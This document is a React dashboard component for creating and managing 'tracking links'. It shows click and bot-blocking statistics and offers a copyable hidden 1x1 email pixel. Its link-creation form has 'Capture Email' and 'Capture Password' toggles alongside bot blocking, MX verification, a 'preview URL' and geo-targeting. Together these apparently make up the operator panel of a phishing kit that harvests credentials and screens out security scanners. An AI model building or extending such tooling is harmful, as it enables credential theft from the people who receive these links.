import { useState, useEffect } from 'react'

const TrackingLinks = () => {
  const [links, setLinks] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [filter, setFilter] = useState('All');
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [hiddenUrls, setHiddenUrls] = useState({});
  const [loading, setLoading] = useState(true);
  const [analytics, setAnalytics] = useState({
    totalClicks: 0,
    realVisitors: 0,
    botsBlocked: 0
  });
  const [newLink, setNewLink] = useState({
    target_url: '',
    preview_url: '',
    campaign_name: '',
    capture_email: false,
    capture_password: false,
    bot_blocking_enabled: true,
    rate_limiting_enabled: false,
    dynamic_signature_enabled: false,
    mx_verification_enabled: false,
    geo_targeting_enabled: false,
    geo_targeting_mode: 'allow',
    allowed_countries: [],
    blocked_countries: [],
    allowed_cities: [],
    blocked_cities: [],
    allowed_regions: [],
    blocked_regions: [],
    expiration_period: 'never'
  });

  useEffect(() => {
    fetchLinks();
    fetchAnalytics();
  }, []);

  const fetchAnalytics = async () => {
    try {
      const response = await fetch('/api/analytics/summary', {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setAnalytics(data);
      } else {
        const totalClicks = links.reduce((sum, link) => sum + (link.total_clicks || 0), 0);
        const realVisitors = links.reduce((sum, link) => sum + (link.real_visitors || 0), 0);
        const botsBlocked = links.reduce((sum, link) => sum + (link.blocked_attempts || 0), 0);
        setAnalytics({ totalClicks, realVisitors, botsBlocked });
      }
    } catch (error) {
      console.error('Error fetching analytics:', error);
      const totalClicks = links.reduce((sum, link) => sum + (link.total_clicks || 0), 0);
      const realVisitors = links.reduce((sum, link) => sum + (link.real_visitors || 0), 0);
      const botsBlocked = links.reduce((sum, link) => sum + (link.blocked_attempts || 0), 0);
      setAnalytics({ totalClicks, realVisitors, botsBlocked });
    }
  };

  const fetchLinks = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/links', {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setLinks(data.links || []);
        const totalClicks = (data.links || []).reduce((sum, link) => sum + (link.total_clicks || 0), 0);
        const realVisitors = (data.links || []).reduce((sum, link) => sum + (link.real_visitors || 0), 0);
        const botsBlocked = (data.links || []).reduce((sum, link) => sum + (link.blocked_attempts || 0), 0);
        setAnalytics({ totalClicks, realVisitors, botsBlocked });
      } else {
        console.error('Failed to fetch links:', response.statusText);
      }
    } catch (error) {
      console.error('Error fetching links:', error);
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = async (text, type) => {
    try {
      await navigator.clipboard.writeText(text);
      const notification = document.createElement('div');
      notification.className = 'fixed top-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg z-50 text-sm font-medium';
      notification.textContent = `${type} copied to clipboard!`;
      document.body.appendChild(notification);
      setTimeout(() => {
        document.body.removeChild(notification);
      }, 3000);
    } catch (error) {
      console.error('Failed to copy to clipboard:', error);
    }
  };

  const deleteLink = async (linkId) => {
    if (window.confirm('Are you sure you want to delete this link?')) {
      setLinks(prev => prev.filter(link => link.id !== linkId));
      
      try {
        const response = await fetch(`/api/links/${linkId}`, {
          method: 'DELETE',
          headers: {
            'Authorization': `Bearer ${localStorage.getItem('token')}`
          }
        });
        
        if (response.ok) {
          fetchLinks();
        } else {
          console.error('Failed to delete link:', response.statusText);
          setLinks(prev => prev.filter(link => link.id !== linkId));
        }
      } catch (error) {
        console.error('Error deleting link:', error);
        setLinks(prev => prev.filter(link => link.id !== linkId));
      }
    }
  };

  const testLink = (link) => {
    const testUrl = link.tracking_url.replace('{id}', 'test-' + Date.now());
    window.open(testUrl, '_blank');
  };

  const regenerateLink = async (linkId) => {
    if (window.confirm('Are you sure you want to regenerate this tracking link? The old link will no longer work.')) {
      try {
        const response = await fetch(`/api/links/${linkId}/regenerate`, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${localStorage.getItem('token')}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          // Update the link in the state with the new tracking URL
          setLinks(prev => prev.map(link => 
            link.id === linkId 
              ? { ...link, tracking_url: data.tracking_url, pixel_url: data.pixel_url }
              : link
          ));
          
          // Show success notification
          const notification = document.createElement('div');
          notification.className = 'fixed top-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg z-50 text-sm font-medium';
          notification.textContent = 'Link regenerated successfully!';
          document.body.appendChild(notification);
          setTimeout(() => {
            document.body.removeChild(notification);
          }, 3000);
        } else {
          console.error('Failed to regenerate link:', response.statusText);
          alert('Failed to regenerate link. Please try again.');
        }
      } catch (error) {
        console.error('Error regenerating link:', error);
        alert('Error regenerating link. Please try again.');
      }
    }
  };

  const createLink = async () => {
    if (!newLink.target_url || !newLink.campaign_name) {
      alert('Please fill in all required fields');
      return;
    }

    try {
      const response = await fetch('/api/links', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify(newLink)
      });
      
      if (response.ok) {
        fetchLinks();
        setShowCreateModal(false);
        setNewLink({
          target_url: '',
          preview_url: '',
          campaign_name: '',
          capture_email: false,
          capture_password: false,
          bot_blocking_enabled: true,
          rate_limiting_enabled: false,
          dynamic_signature_enabled: false,
          mx_verification_enabled: false,
          geo_targeting_enabled: false,
          geo_targeting_mode: 'allow',
          allowed_countries: [],
          blocked_countries: [],
          allowed_cities: [],
          blocked_cities: [],
          allowed_regions: [],
          blocked_regions: [],
          expiration_period: 'never'
        });
      } else {
        console.error('Failed to create link:', response.statusText);
      }
    } catch (error) {
      console.error('Error creating link:', error);
    }
  };

  const filteredLinks = links.filter(link => {
    const matchesSearch = (link.campaign_name && link.campaign_name.toLowerCase().includes(searchTerm.toLowerCase())) ||
                         (link.target_url && link.target_url.toLowerCase().includes(searchTerm.toLowerCase())) ||
                         (link.tracking_url && link.tracking_url.toLowerCase().includes(searchTerm.toLowerCase()));
    const matchesFilter = filter === 'All' || (link.status && link.status.toLowerCase() === filter.toLowerCase());
    return matchesSearch && matchesFilter;
  });

  if (loading) {
    return (
      <div className="p-4 md:p-6 bg-slate-900 min-h-screen text-white">
        <div className="animate-pulse">
          <div className="h-8 bg-slate-700 rounded w-1/4 mb-6"></div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
            {[1, 2, 3].map(i => (
              <div key={i} className="h-24 bg-slate-700 rounded"></div>
            ))}
          </div>
          <div className="space-y-4">
            {[1, 2, 3].map(i => (
              <div key={i} className="h-32 bg-slate-700 rounded"></div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="p-4 md:p-6 space-y-6 bg-slate-900 min-h-screen text-white">
      {/* Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between mb-6 gap-4">
        <div>
          <h1 className="text-xl md:text-2xl font-bold text-white">Tracking Links</h1>
          <p className="text-slate-400 mt-1 text-sm md:text-base">Create and manage your tracking links</p>
        </div>
        
        <div className="flex items-center gap-3">
          {/* Search */}
          <div className="relative">
            <svg className="absolute left-3 top-2.5 h-4 w-4 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
            </svg>
            <input
              type="text"
              placeholder="Search links..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="pl-10 pr-4 py-2 text-sm border border-slate-600 rounded-lg bg-slate-800 text-slate-200 placeholder-slate-400 focus:ring-2 focus:ring-blue-500 focus:border-transparent w-64"
            />
          </div>

          {/* Filter Buttons */}
          {['All', 'Active', 'Paused', 'Expired'].map((filterOption) => (
            <button
              key={filterOption}
              onClick={() => setFilter(filterOption)}
              className={`px-3 py-2 text-sm font-medium rounded-lg transition-colors ${
                filter === filterOption 
                  ? 'bg-blue-600 text-white' 
                  : 'bg-slate-800 text-slate-300 border border-slate-600 hover:bg-slate-700'
              }`}
            >
              {filterOption}
            </button>
          ))}

          {/* Create Button */}
          <button 
            onClick={() => setShowCreateModal(true)}
            className="px-3 py-1.5 bg-green-600 hover:bg-green-700 text-white rounded-md text-xs font-medium transition-colors"
          >
            + Create New Link
          </button>
        </div>
      </div>

      {/* Analytics Overview */}
      <div className="grid grid-cols-3 gap-2 mb-6">
        <div className="bg-slate-800 rounded-lg p-2.5 border border-slate-700">
          <div className="flex items-center gap-2">
            <div className="text-yellow-400">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 15l-2 5L9 9l11 4-5 2zm0 0l5 5M7.188 2.239l.777 2.897M5.136 7.965l-2.898-.777M13.95 4.05l-2.122 2.122m-5.657 5.656l-2.122 2.122" />
              </svg>
            </div>
            <div>
              <p className="text-xs font-medium text-slate-400 uppercase">Total Clicks</p>
              <p className="text-base font-bold text-white">{analytics.totalClicks.toLocaleString()}</p>
            </div>
          </div>
        </div>

        <div className="bg-slate-800 rounded-lg p-2.5 border border-slate-700">
          <div className="flex items-center gap-2">
            <div className="text-blue-400">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197m13.5-9a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0z" />
              </svg>
            </div>
            <div>
              <p className="text-xs font-medium text-slate-400 uppercase">Real Visitors</p>
              <p className="text-base font-bold text-white">{analytics.realVisitors.toLocaleString()}</p>
            </div>
          </div>
        </div>

        <div className="bg-slate-800 rounded-lg p-2.5 border border-slate-700">
          <div className="flex items-center gap-2">
            <div className="text-red-400">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.414-5.414a2 2 0 00-2.828 0L4 12l5.414 5.414a2 2 0 002.828 0L20 9.414a2 2 0 000-2.828z" />
              </svg>
            </div>
            <div>
              <p className="text-xs font-medium text-slate-400 uppercase">Bots Blocked</p>
              <p className="text-base font-bold text-white">{analytics.botsBlocked.toLocaleString()}</p>
            </div>
          </div>
        </div>
      </div>

      {/* Your Tracking Links Section */}
      <div className="bg-slate-800 rounded-lg border border-slate-700 mb-6">
        <div className="p-4 border-b border-slate-700">
          <h2 className="text-lg font-semibold text-white">Your Tracking Links</h2>
          <p className="text-slate-400 text-sm">Manage and monitor your tracking links</p>
        </div>

        <div className="p-4">
          {filteredLinks.length === 0 ? (
            <div className="text-center py-12">
              <p className="text-slate-400 text-lg">No tracking links found.</p>
              <p className="text-slate-500 mt-2">Create your first link to get started!</p>
            </div>
          ) : (
            <div className="space-y-4">
              {filteredLinks.map((link) => (
                <div key={link.id} className="border border-slate-700 rounded-lg p-4">
                  <div className="flex items-start justify-between mb-3">
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-2">
                        <h3 className="text-white font-medium">{link.campaign_name}</h3>
                        <span className="px-2 py-1 bg-green-100 text-green-800 text-xs rounded-full">active</span>
                      </div>
                      <p className="text-slate-400 text-sm break-all">Target: {link.target_url}</p>
                    </div>
                    <div className="flex gap-2 ml-4">
                      <button
                        onClick={() => copyToClipboard(link.tracking_url, 'Tracking URL')}
                        className="p-2 bg-orange-500 hover:bg-orange-600 text-white rounded-lg transition-colors"
                        title="Copy"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                        </svg>
                      </button>
                      <button
                        onClick={() => regenerateLink(link.id)}
                        className="p-2 bg-purple-500 hover:bg-purple-600 text-white rounded-lg transition-colors"
                        title="Regenerate Link"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                        </svg>
                      </button>
                      <button
                        onClick={() => testLink(link)}
                        className="p-2 bg-blue-500 hover:bg-blue-600 text-white rounded-lg transition-colors"
                        title="Test"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                        </svg>
                      </button>
                      <button
                        onClick={() => deleteLink(link.id)}
                        className="p-2 bg-red-500 hover:bg-red-600 text-white rounded-lg transition-colors"
                        title="Delete"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                        </svg>
                      </button>
                    </div>
                  </div>
                  
                  <div className="flex items-center gap-6 mb-3 text-sm">
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                      <span className="text-slate-400">{link.total_clicks || 0} clicks</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                      <span className="text-slate-400">{link.real_visitors || 0} visitors</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 bg-red-500 rounded-full"></div>
                      <span className="text-slate-400">{link.blocked_attempts || 0} Bot protected</span>
                    </div>
                  </div>

                  {!hiddenUrls[link.id] && (
                    <div className="space-y-3">
                      <div>
                        <label className="block text-xs font-medium text-slate-400 mb-1 uppercase">Tracking URL</label>
                        <div className="flex items-center gap-2">
                          <input
                            type="text"
                            value={link.tracking_url || ''}
                            readOnly
                            className="flex-1 px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-sm text-white font-mono"
                          />
                          <button
                            onClick={() => copyToClipboard(link.tracking_url, 'Tracking URL')}
                            className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
                            title="Copy"
                          >
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                            </svg>
                          </button>
                          <button
                            onClick={() => testLink(link)}
                            className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
                            title="Test"
                          >
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                            </svg>
                          </button>
                        </div>
                      </div>
                      <div>
                        <label className="block text-xs font-medium text-slate-400 mb-1 uppercase">Pixel URL</label>
                        <div className="flex items-center gap-2">
                          <input
                            type="text"
                            value={link.pixel_url || ''}
                            readOnly
                            className="flex-1 px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-sm text-white font-mono"
                          />
                          <button
                            onClick={() => copyToClipboard(link.pixel_url, 'Pixel URL')}
                            className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
                            title="Copy"
                          >
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                            </svg>
                          </button>
                        </div>
                      </div>
                      <div>
                        <label className="block text-xs font-medium text-slate-400 mb-1 uppercase">Email Code</label>
                        <div className="flex items-center gap-2">
                          <textarea
                            value={`<img src="${link.pixel_url || ''}" width="1" height="1" style="display:none;" />`}
                            readOnly
                            className="flex-1 px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-sm text-white font-mono resize-none h-16"
                          />
                          <button
                            onClick={() => copyToClipboard(`<img src="${link.pixel_url || ''}" width="1" height="1" style="display:none;" />`, 'Email Code')}
                            className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
                            title="Copy"
                          >
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                            </svg>
                          </button>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Create Link Modal */}
      {showCreateModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-slate-800 rounded-lg w-full max-w-2xl max-h-[90vh] overflow-y-auto">
            <div className="p-6 space-y-4">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-xl font-bold text-white">Create New Link</h3>
                <button 
                  onClick={() => setShowCreateModal(false)}
                  className="text-slate-400 hover:text-white"
                >
                  ✕
                </button>
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Target URL *
                </label>
                <input
                  type="url"
                  placeholder="https://example.com"
                  value={newLink.target_url}
                  onChange={(e) => setNewLink({ ...newLink, target_url: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Preview URL (Optional)
                </label>
                <input
                  type="url"
                  placeholder="https://preview.example.com"
                  value={newLink.preview_url}
                  onChange={(e) => setNewLink({ ...newLink, preview_url: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Campaign Name *
                </label>
                <input
                  type="text"
                  placeholder="My New Campaign"
                  value={newLink.campaign_name}
                  onChange={(e) => setNewLink({ ...newLink, campaign_name: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
                />
              </div>

              {/* Link Expiration */}
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Link Expiration
                </label>
                <select
                  value={newLink.expiration_period}
                  onChange={(e) => setNewLink({ ...newLink, expiration_period: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
                >
                  <option value="never">Never Expires</option>
                  <option value="5hrs">5 Hours</option>
                  <option value="10hrs">10 Hours</option>
                  <option value="24hrs">24 Hours</option>
                  <option value="48hrs">48 Hours</option>
                  <option value="72hrs">72 Hours</option>
                  <option value="weekly">Weekly</option>
                  <option value="monthly">Monthly</option>
                  <option value="yearly">Yearly</option>
                </select>
              </div>

              {/* Security Features */}
              <div className="space-y-3 pt-4 border-t border-slate-700">
                <h4 className="text-lg font-bold text-white">Security Features</h4>
                <div className="flex items-center justify-between">
                  <label htmlFor="bot_blocking" className="text-sm font-medium text-slate-300">Bot Blocking</label>
                  <input
                    type="checkbox"
                    id="bot_blocking"
                    checked={newLink.bot_blocking_enabled}
                    onChange={(e) => setNewLink({ ...newLink, bot_blocking_enabled: e.target.checked })}
                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
                  />
                </div>
                <div className="flex items-center justify-between">
                  <label htmlFor="rate_limiting" className="text-sm font-medium text-slate-300">Rate Limiting</label>
                  <input
                    type="checkbox"
                    id="rate_limiting"
                    checked={newLink.rate_limiting_enabled}
                    onChange={(e) => setNewLink({ ...newLink, rate_limiting_enabled: e.target.checked })}
                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
                  />
                </div>
                <div className="flex items-center justify-between">
                  <label htmlFor="dynamic_signature" className="text-sm font-medium text-slate-300">Dynamic Signature</label>
                  <input
                    type="checkbox"
                    id="dynamic_signature"
                    checked={newLink.dynamic_signature_enabled}
                    onChange={(e) => setNewLink({ ...newLink, dynamic_signature_enabled: e.target.checked })}
                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
                  />
                </div>
                <div className="flex items-center justify-between">
                  <label htmlFor="mx_verification" className="text-sm font-medium text-slate-300">MX Verification</label>
                  <input
                    type="checkbox"
                    id="mx_verification"
                    checked={newLink.mx_verification_enabled}
                    onChange={(e) => setNewLink({ ...newLink, mx_verification_enabled: e.target.checked })}
                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
                  />
                </div>
              </div>

              {/* Geo Targeting */}
              <div className="space-y-3 pt-4 border-t border-slate-700">
                <div className="flex items-center justify-between">
                  <label htmlFor="geo_targeting" className="text-sm font-medium text-slate-300">Geo Targeting</label>
                  <input
                    type="checkbox"
                    id="geo_targeting"
                    checked={newLink.geo_targeting_enabled}
                    onChange={(e) => setNewLink({ ...newLink, geo_targeting_enabled: e.target.checked })}
                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
                  />
                </div>
                {newLink.geo_targeting_enabled && (
                  <div className="space-y-3 pl-4 border-l-2 border-slate-600">
                    <div>
                      <label className="block text-sm font-medium text-slate-300 mb-2">Mode</label>
                      <select
                        value={newLink.geo_targeting_mode}
                        onChange={(e) => setNewLink({ ...newLink, geo_targeting_mode: e.target.value })}
                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
                      >
                        <option value="allow">Allow (Whitelist)</option>
                        <option value="block">Block (Blacklist)</option>
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-slate-300 mb-2">Countries (comma-separated codes, e.g., US, GB)</label>
                      <input
                        type="text"
                        value={newLink.geo_targeting_mode === 'allow' ? newLink.allowed_countries.join(', ') : newLink.blocked_countries.join(', ')}
                        onChange={(e) => {
                          const countries = e.target.value.split(',').map(c => c.trim().toUpperCase()).filter(c => c);
                          setNewLink({ ...newLink, [newLink.geo_targeting_mode === 'allow' ? 'allowed_countries' : 'blocked_countries']: countries });
                        }}
                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 text-white rounded-lg focus:border-blue-500 focus:outline-none"
                      />
                    </div>
                  </div>
                )}
              </div>

              {/* Capture Options */}
              <div className="space-y-3 pt-4 border-t border-slate-700">
                <h4 className="text-lg font-bold text-white">Capture Options</h4>
                <div className="flex items-center justify-between">
                  <label htmlFor="capture_email" className="text-sm font-medium text-slate-300">Capture Email</label>
                  <input
                    type="checkbox"
                    id="capture_email"
                    checked={newLink.capture_email}
                    onChange={(e) => setNewLink({ ...newLink, capture_email: e.target.checked })}
                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
                  />
                </div>
                <div className="flex items-center justify-between">
                  <label htmlFor="capture_password" className="text-sm font-medium text-slate-300">Capture Password</label>
                  <input
                    type="checkbox"
                    id="capture_password"
                    checked={newLink.capture_password}
                    onChange={(e) => setNewLink({ ...newLink, capture_password: e.target.checked })}
                    className="h-4 w-4 text-blue-600 rounded focus:ring-blue-500"
                  />
                </div>
              </div>
              
              <div className="flex gap-3 pt-4">
                <button 
                  onClick={() => setShowCreateModal(false)}
                  className="flex-1 px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg"
                >
                  Cancel
                </button>
                <button 
                  onClick={createLink}
                  className="flex-1 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg"
                >
                  Create Link
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default TrackingLinks;

